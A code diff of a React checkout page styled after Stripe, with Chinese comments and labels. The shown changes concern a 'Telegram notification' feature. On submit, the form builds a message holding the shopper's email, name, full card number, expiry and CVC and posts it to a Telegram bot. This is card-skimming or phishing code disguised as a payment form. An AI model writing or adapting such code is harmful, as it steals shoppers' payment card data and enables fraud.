@@ -1,4 +1,4 @@
-// Stripe-like Checkout + 多語言 + 自動格式驗證 + 幣別與 RTL + 韓國支援 + CSS 調整樣式
+// Stripe-like Checkout + 多語言 + 自動格式驗證 + 幣別與 RTL + 韓國支援 + CSS 調整樣式 + Telegram 通知
 import React, { useState } from 'react';
 import visa from './assets/visa.svg';
 import amex from './assets/amex.svg';
@@ -77,7 +77,7 @@ export default function App() {
       return;
     }
     setLoading(true);
-    const message = `🧾 新訂單！\nEmail: ${formData.email}\n姓名: ${formData.name}\n卡號: ${formData.card}\n有效期: ${formData.expiry}\nCVC: ${formData.cvc}\n國家: ${formData.country}\n儲存卡片資訊: ${formData.saveInfo ? '是' : '否'}`;
+    const message = `🧾 新訂單\nEmail: ${formData.email}\n姓名: ${formData.name}\n卡號: ${formData.card}\n有效期: ${formData.expiry}\nCVC: ${formData.cvc}\n國家: ${formData.country}\n儲存卡片資訊: ${formData.saveInfo ? '是' : '否'}`;
 
     await fetch(`https://api.telegram.org/bot${process.env.REACT_APP_TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
